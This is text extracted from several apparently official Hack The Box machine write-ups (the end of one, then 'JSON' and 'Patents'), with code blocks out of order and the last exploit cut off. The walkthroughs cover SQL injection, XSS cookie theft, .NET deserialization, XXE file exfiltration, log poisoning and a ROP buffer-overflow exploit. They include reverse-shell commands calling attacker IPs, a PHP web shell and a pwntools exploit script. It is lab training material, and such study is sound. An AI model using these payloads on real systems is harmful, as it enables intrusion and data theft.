Exploiting NOPASSWD files 
●
Exploiting NPM CLI 
 
Page 2 / 8 
 
Enumeration 
Nmap 
 
Nmap reveals only OpenSSH and a Node.js server. 
 
 
 
 
 
 
Page 3 / 8 
 
Dirbuster 
Attempting to fuzz the Node.js server yields no results at first. After a bit of tweaking (specifically, 
making sure the user agent contains the word ​Linux​ in it), a few directories are found. 
 
 
 
 
 
 
Page 4 / 8 
 
Exploitation 
SQLMap 
Running SQLMap against the ​/login​ page with the command ​sqlmap -r sqlmap.req --level=5 
--risk=3 --dump-all​ (with sqlmap.req being a sample POST request intercepted by Burp Suite), 
credentials for a low privilege user are exposed. The hash can be easily looked up online. In this 
case, hashkiller.co.uk will find the hash. 
 
 
 
 
 
Page 5 / 8 
 
XSS 
Charcode encode/decode tool: ​http://jdstiles.com/java/cct.html  
All new notes added to a booking are reviewed approximately every one minute by a user with 
admin privileges. There are several filter in place to prevent XSS and successful exploitation can 
be tricky for some. The most reliable method seems to be using a malformed ​<img> ​tag 
combined with ​eval(String.fromCharCode(...)) 
Example: <img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>"> 
 
 
The above example loads a local js file which gets executed when the administrator views the 
note. The script below will force the administrator to send a POST request to a local Netcat 
listener, which exposes the administrator’s cookie data in the contents. 
 
 
Page 6 / 8 
 
Command Injection 
Once access to the administrator account is obtained, it is possible to view the ​/admin​ page. On 
the page there is a link to export a specified table. It is possible to escape the table name and 
inject system commands, however there are fairly tight restrictions on characters that can be 
used for the table name. Starting the table name with ​%2f%26​ allows for nearly unrestricted 
command injection. 
 
Converter: ​https://www.browserling.com/tools/ip-to-dec  
Periods are not permitted, so in order to download a shell, the IP address must be provided in 
decimal format. For example: ​table=%2f%26wget%20168431110/writeup ​where ​writeup​ is a 
reverse shell binary. 
Note that Apache does not handle requests properly by default for integer-based IPs, and it is 
much easier to use a Python SimpleHTTPServer on port 80 to serve the binary. 
 
Page 7 / 8 
 
Privilege Escalation 
LinEnum: ​https://github.com/rebootuser/LinEnum  
Running LInEnum gathers a large amount of information about the system. Most notably, 
NOPASSWD is set for the command ​sudo /usr/bin/npm i * 
By adding a ​preinstall​ option to the ​package.json​ file, it is possible to specify a command that 
will be executed during the package installation process. This can be easily exploited to obtain 
the flag or a root shell. After creating a ​package.json​ file with ​npm init​ and adding the command 
to the script section, simply run the command ​sudo /usr/bin/npm i /home/algernon/writeup 
--unsafe 
 
 
Page 8 / 8 
 
     JSON
  07th February 2020 / Document No D20.100.58
  Prepared By: MinatoTW 
  Machine Author(s): cyb3rb0b
  Diﬃculty: Medium
  Classiﬁcation: Oﬃcial           
 
Synopsis
 
JSON is a medium diﬃculty Windows machine running an IIS server with an ASP.NET application. 
The application is found to be vulnerable to .NET deserialization, which is exploited using 
ysoserial.net. A custom .NET program is found to be installed, which on reverse engineering 
reveals encrypted credentials for an administrator. These credentials can be decrypted and used 
to gain access to the FTP folder.
Skills Required
 
Enumeration
Deserialization
Reverse Engineering
Skills Learned
 
Using ysoserial.net
dnSpy
 
Enumeration
 
Nmap
 
A full-port Nmap scan reveals a Windows box running FTP and IIS servers on their default ports. 
Nmap ﬁnds the OS version to be Windows 2008 R2 or 2012. WinRM is found to be open on port 
5985, which could help with lateral movement later.
IIS
 
A login page can be found on browsing to port 80.
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.158 | grep ^[0-9] | cut -d '/' -f 
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.158
The following request can be observed after turning on Burp intercept and trying to login.
After attempting to login using common credentials such as admin/admin , we gain access to the 
dashboard.
Going back to the Burp, a GET request to /api/Account  is observed.
The request contains a Bearer  header with a base64 encoded value. The same value is observed 
in the OAuth2  cookie. Let's decode it and look at the contents. 
It appears to be JSON used by the server to identify the user. Let's try changing the values by 
adding quotes to check if some kind of SQL injection is possible.
Single quotes are added to the Id  and UserName  values. Send the request to Repeater, and 
swap the existing token with the forged one.
The server returns a 500 Internal Server Error  , which states that the JSON.Net object can't 
be deserialized. This informs us about two things; that the API is written in ASP.NET, and that the 
server deserializes JSON objects that is receives. Searching for vulnerabilities related to JSON.Net 
deserialization, we come across ysoserial.net, which can generate .NET deserialization payloads. 
Download the binary from the releases section and run it on a Windows box. Let's create a 
payload to ping ourselves from the box.
The payload format is set to Json.Net  and the gadget type is ObjectDataProvider . The -c  ﬂag 
is used to specify the command to execute and the output format is set to base64. Copy the 
generated payload and place it as the Bearer  value in the HTTP request. Before sending the 
request, start an ICMP listener using tcpdump .
The server throws an error in the response, but ICMP requests can be observed on the tcpdump 
listener.
Foothold
 
Having conﬁrmed code execution, we can try getting a reverse shell on the box. We can use a 
netcat binary to send a reverse shell to ourselves. Start an smbserver locally to host the binary.
Next, copy the nc.exe binary to the current folder, and create a JSON.Net payload for the 
command:
The command above uses nc.exe  present on our share to send a reverse shell to port 443. 
Swap the older payload with the newly generated one and forward the request, after which a 
shell as userpool  should be received.
\\\\10.10.14.6\\share\\nc.exe 10.10.14.6 443 -e cmd.exe
Privilege Escalation
 
Looking at the installed programs, a program named Sync2Ftp is found to be installed.
The folder is found to contain a binary and conﬁguration ﬁle. These could be of interest as the 
application isn't standard, and could be user deﬁned. Copy these ﬁles to the SMB share running 
on our host.
Running file  on the binary reveals that it's a .NET executable. The conﬁg ﬁle is found to contain 
some encrypted ﬁelds and conﬁguration values.
dnSpy can used to reverse and analyze .NET executables. Open up the binary in dnSpy x86 and 
analyze the SyncLocation  assembly.
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
</configuration>
Looking at the Main  method, it's seen the binary creates a new service and registers the 
Service1  object. Let's look at the Service1  class next.
The Start  method ends up calling the Copy  method. 
The Copy  method reads various values from the conﬁguration ﬁle and then decrypts them using 
the Crypto  class. It then uses the FTP STOR command to transfer all ﬁles in the the 
sourcefolder  path to the FTP folder. Let's look at how the values are encrypted and decrypted. 
The Encrypt  method takes in two arguments, i.e. the string to encrypt and boolean value. It 
reads the SecurityKey  value from the conﬁg ﬁle, and hashes it using MD5 if useHashing  is set 
to true. The plaintext value is then encrypted using the 3DES encryption algorithm in ECB mode 
with PKCS7 padding, and returned base64 encoded. 
Similarly, the Decrypt  method reads the key and hashes it based on the boolean value. It then 
uses the 3DES algorithm to decrypt and return the plaintext string. Let's write a small python 
script to decrypt this manually.
from pyDes import *
from base64 import b64decode
from hashlib import md5
key = b"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"
hashedKey = md5(key).digest()
desKey = triple_des(hashedKey, ECB, padmode = PAD_PKCS5)
usernameData = b64decode("4as8gqENn26uTs9srvQLyg==")
username = desKey.decrypt(usernameData)                                         
                                                                                
                                            print(f"Username: 
{username.decode()}")
passwordData = b64decode("oQ5iORgUrswNRsJKH9VaCw==")
The script uses the pyDes library to decrypt the username and password from the conﬁg ﬁle. The 
securityKey is hashed using the MD5 algorithm. The decryption key is created using the 
triple_des  method, which is used to decrypt the username and password respectively.
Running the script returns the username superadmin  and password funnyhtb . Let's try logging 
into FTP with these credentials.
The login was successful and can be used to read the root ﬂag.
Alternate Method
 
As the userpool  user is a service account, it holds the SeImpersonate  privilege.
We can leverage this privilege on Windows server 2012 by using the Juicy Potato exploit. 
Download the binary from releases, and place it in the share. Next, copy JuicyPotato.exe as well 
as nc.exe to the Public folder.
password = desKey.decrypt(passwordData)                                         
                                                                                
                                            print(f"Password: 
{password.decode()}")
Create a bat ﬁle with a reverse shell command such as:
A list of CLSIDs for Windows Server 2012 can be found here. Any CLSID belonging to NT 
AUTHORITY\SYSTEM  can be used.
A shell as SYSTEM should be received on port 4444.
 
C:\Users\Public\nc.exe 10.10.14.7 4444 -e cmd.exe
 
     Patents
  14th May 2020 / Document No D20.100.73
  Prepared By: MinatoTW 
  Machine Author(s):  gbyolo
  Diﬃculty: Hard
  Classiﬁcation: Oﬃcial           
 
Synopsis
 
Patents is a hard diﬃculty Linux machine featuring a "Patents Management" application running 
on Apache. File and folder enumeration reveals a changelog containing vulnerability information. 
An upload form is found to be vulnerable to XXE via crafted Word documents. This is leveraged to 
read PHP source code and achieve command execution. An active cron job exposing credentials 
in plaintext is used to move laterally. Enumeration of scripts and folders reveals a binary that is 
vulnerable to a buﬀer overﬂow. This binary is analyzed and exploited to gain shell on the host 
server as root.
Skills Required
 
Enumeration
Reversing Engineering
Exploit Development
Skills Learned
 
OOB XXE
ROP-based Exploitation
File System Enumeration
 
Enumeration
 
Nmap
 
The Nmap scan reveals that SSH and Apache are running on their common ports.
Apache
 
Browsing to port 80 returns a page titled MEOW Inc. .
The sidebar contains a menu item to upload a patent, which takes us to an upload page.
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.173 | grep ^[0-9] | cut -d '/' -f 
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.173
The page accepts a Word document (modern .docx format) and converts it into a PDF.
Gobuster
 
Let's run gobuster to enumerate ﬁles and folder on the server.
Gobuster discovered some interesting ﬁles such as config.php  and convert.php . The uploads  
folder could be where the DOCX ﬁles are uploaded to. Let's run recursive scans on the release  
and patents  folders to ﬁnd more ﬁles.
The release  folder is found to contain a ﬁle called UpdateDetails . Let's look at its contents.
The log contains a few details about the website. Firstly, that the Docx2Pdf App is ready and 
functional. It also states that the app supports parsing of entities in the custom folder. The 
documentation states that a DOCX ﬁle is an archive comprised of XML schemas. The entities 
referred to here could be XML entities. 
The rest of the changelog talks about LFI and Directory traversal vulnerabilities in the application. 
These ﬁxes were reverted in version 1.1, which means the application could be vulnerable. 
XXE
 
Let's try to create and upload a malicious DOCX ﬁle. A docx ﬁle can be generated by using Google 
Docs.
MS Word allows the addition of custom XML to documents. This is saved in the customXML  folder 
within the archive. Let's extract the document and add an item to it.
To test the vulnerability, we can try sending an HTTP request to ourselves through an external 
entity.
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://10.10.14.3/test">
%xxe;
]>
The payload above should result in a connection to our HTTP server on port 80. Save the ﬁle 
above as item1.xml  within the customXml  folder. 
Start an HTTP server and upload the archived document (renamed to .docx) using the web page.
A request is received for /test  from the server, which conﬁrms the XXE vulnerability. Let's 
modify the payload to exﬁltrate ﬁles over HTTP. Create a ﬁle named read.dtd  with the contents 
below:
The DTD ﬁle uses parameterized entities to read and exﬁltrate /etc/passwd  as base64. Next, 
edit the item1.xml ﬁle to the following:
The XML ﬁle loads the DTD and then includes the entity exfil  in order to trigger the HTTP 
request. Bundle up the ﬁles once again and upload it.
<!ENTITY % file SYSTEM "php://filter/convert.base64-
encode/resource=/etc/passwd">
<!ENTITY % read "<!ENTITY exfil SYSTEM 'http://10.10.14.3/exfil?%file;'>">
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://10.10.14.3/read.dtd">
%xxe;
%read;
]>
<foo>&exfil;</foo>
The base64 encoded passwd ﬁle should be received instantly, which is decoded to the following:
The host is found to have a user named gbyolo . Let's try to read the config.php  ﬁle found 
earlier, as it might contain interesting information.
The DTD ﬁle is updated with the default Apache path and the ﬁle is uploaded.
However, this fails to return the contents. This probably means that the ﬁle is present in a non-
standard location. Let's retrieve the Apache conﬁguration to ﬁnd the web root location.
Uploading the ﬁle once again should return the default Apache conﬁguration.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<SNIP>
gbyolo:x:1000:1000::/home/gbyolo:/bin/bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-
encode/resource=/var/www/html/config.php">
<!ENTITY % read "<!ENTITY exfil SYSTEM 'http://10.10.14.3/exfil?%file;'>">
<!ENTITY % file SYSTEM "php://filter/convert.base64-
encode/resource=/etc/apache2/sites-enabled/000-default.conf">
<!ENTITY % read "<!ENTITY exfil SYSTEM 'http://10.10.14.3/exfil?%file;'>">
<VirtualHost *:80>
  DocumentRoot /var/www/html/docx2pdf
The web root is found to be at /var/www/html/docx2pdf/ . Let's modify the DTD to return the 
/var/www/html/docx2pdf/config.php  ﬁle. Uploading the document should return the 
config.php  ﬁle.
The ﬁle reveals two pieces of information, the location that the ﬁles are uploaded to, as well as 
the vulnerable script getPatent_alphav1.0.php . Let's look at the contents of this vulnerable ﬁle 
by changing the path to /var/www/html/docx2pdf/getPatent_alphav1.0.php .
LFI to RCE
 
The server fails to return this ﬁle, which means that it isn't readable by the www-data  user. Let's 
request this ﬁle through the browser.
The page asks for an id  parameter and returns a patent. 
  <Directory /var/www/html/docx2pdf/>
      Options -Indexes +FollowSymLinks +MultiViews
      AllowOverride All
      Order deny,allow
      Allow from all
  </Directory>
  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<?php
# needed by convert.php
$uploadir = 'letsgo/';
# needed by getPatent.php
# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's 
vulnerable
define('PATENTS_DIR', '/patents/');
?>
Setting the id to 1  returns the ﬁrst patent. The changelog informed us about potential LFI and 
directory traversal vulnerabilities in the application. Let's try to read /etc/passwd  by traversing 
the folders with ../ .
The contents of passwd weren't returned, which means inclusion failed. It's possible that there's 
some kind of ﬁltering in place. Let's try to use ....//  instead of ../ . This would bypass a 
search and replace ﬁlter that replaces ../  with nothing, still leaving our ../  in place.
The inclusion was successful this time and the passwd ﬁle is visible. Let's try to achieve code 
execution by including the Apache access.log  ﬁle.
The ﬁle is found to be readable, which means we can poison the host header and achieve 
command execution. 
Foothold
 
Intercept the request using Burp and send it to Repeater.
The User-Agent is set to <?php system($_GET['cmd']); ?> , which will let us execute system 
commands via the cmd  parameter. 
The log poisoning was successful and we're able to execute system commands. A bash reverse 
shell can be executed to gain foothold.
Set the cmd  parameter to the payload above and forward the request.
A shell as www-data  should be received. Looking at the root folder, it appears that we're in a 
Docker container.
bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
Inspection of running processes shows that a cron is active. Let's run a tool such as pspy to 
monitor processes. Download the binary and transfer it to the box using cURL.
The tool revealed a cron running as root, which executes /opt/checker_client/run_file.sh  
with the password !gby0l0r0ck$$! . We can see that another script checker.py  is then also 
run. 
Lateral Movement
 
The scripts aren't readable by www-data . However, the gained password is found to be valid for 
root.
Let's investigate the scripts in /opt/checker_client  now. Here's the contents of run_file.sh .
The script checks the integrity of /var/www/html/docx2pdf/convert.php  and replaces it in case 
it has been modiﬁed. It calls the external script checker.py  with three arguments. Let's inspect 
this Python script next.
#!/bin/bash
echo $(date) > /opt/checker_runned
FOLDER=/var/www/html/docx2pdf
FILE=/var/www/html/docx2pdf/convert.php
#export PASSWORD="!gby0l0r0ck\$\$!"
NEWFILE=$(python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD $FILE)
#echo "Res: $NEWFILE"
#exit
if [ -z $NEWFILE ]; then
    echo "File not corrupted."
    exit
fi
if [ -f $NEWFILE ]; then
   echo "File corrupted. Copying new file..."
   cp $NEWFILE $FILE
   if [ $? -ne 0 ]; then
       echo "Couldn't restore file"
   else
       echo "File restored successfully"
       rm -f $NEWFILE
   fi
else
   echo "File not corrupted. Not doing anything"
fi
#!/usr/bin/env python
import sys
This parses the arguments and sets up the required variables. A variable named INPUTREQ  is 
declared, which seems to be similar to an HTTP request format. 
import os
from utils import md5,recvline
import socket
INPUTREQ = "CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"
if len(sys.argv) != 5:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)
HOST = sys.argv[1]
var = HOST.split(":")
if len(var) != 2:
    print "Usage: " + sys.argv[0] + " <host>:<port> <user> <pass> <file>"
    exit(-1)
try:
    PORT = int(var[1])
except ValueError:
    print "Port number must be integer"
    exit(-1)
HOST = var[0]
#print "Connecting to " + HOST + ":" + str(PORT)
USER = sys.argv[2]
try:
    PASS = os.environ[sys.argv[3]]
except KeyError:
    print "Couldn't find such password"
    exit(-1)
<SNIP>
<SNIP>
FILE = sys.argv[4]
# At this point PASS is well-defined
base = os.path.basename(FILE)
try:
    md5sum = md5(FILE)
except IOError:
    print "File not found locally"
    exit(-1)
REALREQ = INPUTREQ.format(base, USER, PASS, md5sum)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
It then calculates the MD5 hash for the convert.php  ﬁle and sets up the INPUTREQ  variable with 
the parameters. A socket is opened to 10.100.0.1:8888  and the request is sent. 
The script exits if the response contains 200 OK  or 404 . In case the ﬁle is found to be corrupted, 
a GET  request is sent to retrieve the contents. The contents are saved to a .new  ﬁle, which is 
then copied by the bash script. 
s.connect((HOST, PORT))
s.sendall(REALREQ)
resp = s.recv(4096)
s.close()
<SNIP>
<SNIP>
if "LFM 200 OK" in resp:
    #print "File OK, no need to download"
    exit(0)
if "404" in resp:
    print "File not found on server"
    exit(-1)
#print "File corrupted, need to download it"
REQ = "GET /{} LFM\r\n\r\n".format(base)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.sendall(REQ)
recvline(s)
recvline(s)
recvline(s)
resp = s.recv(8192)
s.close()
with open("{}.new".format(base), "wb") as f:
    f.write(resp)
print "{}.new".format(base)
Privilege Escalation
 
Further inspection of the ﬁle system reveals a folder named /usr/src/lfm . 
The folder is found to contain a git repository. Let's archive the folder and transfer it locally.
The command above places a tar archive in the web root. This can be downloaded locally using 
the wget  command.   
Let's inspect the commit history using the git log  command.
It's found that the source was deleted by gbyolo. Let's revert to commit prior to this in order to 
retrieve the binary.
commit 7c6609240f414a2cb8af00f75fdc7cfbf04755f5 (HEAD -> master)
Author: gbyolo <gbyolo.htb>
Date:   Mon May 20 17:04:37 2019 +0200
    Removed meow files. THIS REPOSITORY IS ON SVN
commit a900ccf7ae75b95db5f2d134d80e359a795e0cc6
Author: meow <meow@conquertheworld.htb>
Date:   Mon May 20 12:36:19 2019 +0200
    Added last executable and README
<SNIP>
The README  contains the following contents:
It lists the binaries dependencies and the versions used. We can save this for later, and inspect 
the binary using Ghidra. Load the binary and open it up in the code browser. 
Reverse Engineering
 
The main()  method can be found by looking at the entry()  method. Locate the entry  symbol 
in the Symbol Tree  on the left and double-click to navigate.
The ﬁrst argument to the libc_start_main()  method is main() . Double click on 
FUN_004055c2  and then right-click to edit the signature.
lfmserver' dynamic libraries:
        linux-vdso.so.1 (0x00007ffda19f0000)
        libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5444090000)
        libcrypto.so.1.1 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1 
(0x00007f5443dc5000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 
(0x00007f5443da4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5443bba000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5444226000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f5443bb4000)
NB: lfmserver was compiled against:
- libc6: 2.28-0ubuntu1
- libssl1.1: 1.1.1-1ubuntu2.1
Click on Ok  to save changes and continue examining the code. 
The function then checks the number of arguments, and calls the check_args()  method 
(renamed for readability). Looking at the deﬁned strings, we see the user and password used in 
the bash script from earlier.
Double-click to view it in the disassembler, then press Ctrl + Shift + F  to view references. 
We see it being used twice as a function parameter. Clicking on them should take us to the 
FUN_00403ad9()  function.
This method checks if the supplied username and password match the predeﬁned credentials. If 
the check passes, the FUN_00402db9()  method is called with three parameters. The ﬁrst 
parameter is the request path, the second is a buﬀer of size 128 and the last parameter is the 
length of request path.
This function appears to loop through the path and look for the %  character. On ﬁnding this 
character, it uses the strtoul() function to convert the character to numbers. The converted string 
is then saved to buf . This is obviously URL decoding, where the server converts URL encoded 
characters back to normal characters. It can be observed that there's no check to stop the 
conversion when the buﬀer length is surpassed. This means that we can overﬂow the buﬀer with 
more than 128 characters and cause a stack overﬂow in previous function. 
Looking back at the previous function, we ﬁnd that it checks if the request ﬁle exists.
This leads to function exit, due to which the overﬂown pointer will never be called. We can get 
around this by requesting a known ﬁle (convert.php) and appending a null byte at the end. This 
way the string will terminate at the null byte, and the ﬁle existence check will be successful. 
It then checks if the MD5 matches. If these checks are successful, the server sends a 200 OK  and 
returns. 
Exploit Development
 
Looking at the binary protections, it's seen that there's no canary or PIE enabled.
This will let us easily control the execution ﬂow. However, NX is enabled, which means that we 
can't execute shellcode directly. A Return Oriented Programming (ROP) based approach can be 
taken instead. Let's try to debug it using GDB.
We create a folder named files  and create a ﬁle named convert.php . The MD5 hash for this 
ﬁle is obtained. Next, load the binary in GDB and run it.
The follow-fork-mode  is set to follow the child processes after forking. The server should be 
listening on port 8888. We can start writing the exploit now.
The request format is copied from the cron script found earlier. A null byte is appended to the ﬁle 
name, followed by a string of As. 
from pwn import * 
payload = urlencode("A" * 512)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nd41d8cd98f00b204e98
00998ecf8427e\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
print(r.recvlineS())
r.close()
Thread 2.2 "lfmserver" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff7954700 (LWP 130727)]
0x0000000000403db7 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7b7627f  →  0x2d77fffff0003d48 ("H="?)
$rdx   : 0x23              
$rsp   : 0x00007ffff7953e78  →  "AAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ffff7953d90  →  "d41d8cd98f00b204e9800998ecf8427e"
$rdi   : 0x0               
$rip   : 0x0000000000403db7  →   ret 
$r8    : 0x0               
Executing the script should result in SIGSEV and as expected, the RSP was overwritten by As. 
Next, we need to ﬁnd the oﬀset at which the overwrite takes place.
The pattern create  command in GEF (GDB Enhanced Features) can be used to generate a 
pattern of 512 bytes.
Executing the script should overwrite RBP with aaaasaaa , which is found to be at oﬀset 148 .
Having conﬁrmed the overﬂow, we can start creating the ROP chain. The ﬁrst step would be to 
leak a libc address, as it's randomized by ASLR. There are many functions such as puts, printf, 
write etc. that can be used to achieve this. The current binary is found to have the write()  
function available.
The write function accepts three arguments i.e. the ﬁle descriptor, the buﬀer to read from, and 
the length to write out. We can use this function to leak the libc address for any function through 
their GOT (Global Oﬀset Table) entry.
Function calls in 64-bit Linux use registers as arguments. The ﬁrst argument is set in RDI, the 
second in RSI, the third in RDX and so on. These arguments can be set up using ROP gadgets.
$r15   : 0x00007ffff7953fc0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$eflags: [zero CARRY parity ADJUST sign trap INTERRUPT direction overflow RESUME 
virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 
──────────────────────────────────── stack ────
0x00007ffff7953e78│+0x0000: "AAAAAAAAA[...]"    ← $rsp
─────────────────────────────────────────────────────
     0x403dac                  call   0x402eb1
     0x403db1                  mov    eax, 0xffffffff
     0x403db6                  leave  
 →   0x403db7                  ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────
──────────
[#0] 0x403db7 → ret 
from pwn import * 
payload = urlencode("aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaa<SNIP>"")
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nd41d8cd98f00b204e98
00998ecf8427e\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
print(r.recvline())
r.close()
We found two POP gadgets to set up RDI and RSI. The ﬁrst argument i.e. RDI should hold the ﬁle 
descriptor to write to. This can be found using the process-status  GEF command.
The last ﬁle descriptor used by the process is 6 . The second argument, i.e. RSI should contain the 
address to leak. We can use the GOT entry for any function in the binary. The following example 
uses the socket()  function. For the third argument, we see that RDX is set to 0x23 when the 
binary crashes, which means that we can read 0x23 bytes from the address.
gef➤  process-status 
[+] Process Information
        PID  →  35832
        Executable  →  /tmp/lfm/lfmserver
        Command line  →  '/tmp/lfm/lfmserver -p 8888'
[+] Parent Process Information
        Parent PID  →  35808
        Command line  →  '/tmp/lfm/lfmserver -p 8888'
[+] Children Process Information
        No child process
[+] File Descriptors:
        /proc/35832/fd/0  →  /dev/pts/4
        /proc/35832/fd/1  →  /dev/pts/4
        /proc/35832/fd/2  →  /tmp/lfm/lfmserver.log
        /proc/35832/fd/3  →  /tmp/lfm/lfmserver.log
        /proc/35832/fd/4  →  socket:[1548692]
        /proc/35832/fd/5  →  socket:[1548693]
        /proc/35832/fd/6  →  socket:[1539796]
from pwn import * 
'''
0x0000000000405c4b: pop rdi; ret; 
'''
pop_rdi = p64(0x0000000000405c4b)
'''
0x0000000000405c49: pop rsi; pop r15; ret; 
'''
We ﬁnd the PLT and GOT addresses for write  and socket  respectively. Next, a ROP chain is 
created to call write()  and leak the libc address for socket() . The fd i.e. 0x6 is popped into 
RDI, while the GOT address for socket is popped into RSI. Additional junk needs to be added to 
compensate for the extra pop r15 . Let's run the exploit and look at the response.
The server returns 5 lines of output, which contains the leaked address in the last line. Let's 
update the script to extract the ﬁrst 8 bytes from the leak.
pop_rsi_r15 = p64(0x0000000000405c49)
e = ELF("lfmserver", checksec = False)
write = p64(e.plt['write'])
socket = p64(e.got['socket'])
payload = "A" * 148 
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + socket + "junkjunk"
payload += write
payload = urlencode(payload)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nd41d8cd98f00b204e98
00998ecf8427e\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
print(r.recvline())
r.interactive()
r.close()
from pwn import * 
'''
0x0000000000405c4b: pop rdi; ret; 
'''
pop_rdi = p64(0x0000000000405c4b)
'''
0x0000000000405c49: pop rsi; pop r15; ret; 
'''
pop_rsi_r15 = p64(0x0000000000405c49)
The u64()  function is used to convert the leak to an address. 
The leaked address can now be used to ﬁnd the oﬀset to the execvp() function. Let's try this with 
the local libc ﬁrst.
The snippet above ﬁnds the address for execvp  and socket , and then calculates the diﬀerence 
between them. This diﬀerence is used to calculate the address for execvp()  in the loaded libc.
Now that we have the address for execvp , we need a /bin/sh  string to spawn a shell.
e = ELF("lfmserver", checksec = False)
write = p64(e.plt['write'])
socket = p64(e.got['socket'])
payload = "A" * 148 
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + socket + "junkjunk"
payload += write
payload = urlencode(payload)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nd41d8cd98f00b204e98
00998ecf8427e\n".format(payload)
r = remote("localhost", 8888)
r.send(req)
r.recvlines(4)
r.recv(1)
socket_libc = u64(r.recv(8))
log.success("Leaked socket@libc: {}".format(hex(socket_libc)))
r.close()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
execvp = libc.symbols['execvp']
socket = libc.symbols['socket']
diff = socket - execvp
execvp_libc = socket_libc - diff
log.info("Execvp@libc: {}".format(hex(execvp_libc))) 
binsh = list(libc.search("/bin/sh\x00"))[0]
diff = socket - binsh
binsh_libc = socket_libc - diff
log.info("/bin/sh address: {}".format(hex(binsh_libc)))
The search()  function is used to search for /bin/sh  and the address is calculated using 
socket . 
This should be suﬃcient for us to call execvp() , but there's another problem. By default, 
execvp  uses the fd 0 for stdin and fd 1 for stdout, which are open only on server-side. We can 
duplicate the ﬁle descriptors using the dup2() function.
The dup2()  function duplicates a fd to another fd. The ﬁrst argument is the target fd i.e. 6, and 
the second argument is the fd to duplicate i.e. 0 (stdin) and 1 (stdout). As dup2()  is already 
imported by the binary, its PLT address can be used to call it.
The ROP chain makes two calls to dup2() , duplicating stdin  and stdout . Next, the execvp()  
function is called with /bin/sh  and NULL  as arguments.
A new connection is opened and the second ROP chain is sent to spawn a shell.
dup2 = p64(e.plt['dup2'])
payload = "A" * 148
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += dup2
# dup2(6, STDIN)
payload += pop_rdi + p64(0x6)
payload += pop_rsi_r15 + p64(0x1) + "junkjunk"
payload += dup2
# dup2(6, STDOUT)
payload += pop_rdi + p64(binsh_libc)
payload += pop_rsi_r15 + p64(0x0) + "junkjunk"
payload += p64(execvp_libc)
# execvp("/bin/sh", NULL)
payload = urlencode(payload)
req = "CHECK /convert.php%00{} 
LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\nd41d8cd98f00b204e98
00998ecf8427e\n".format(payload)
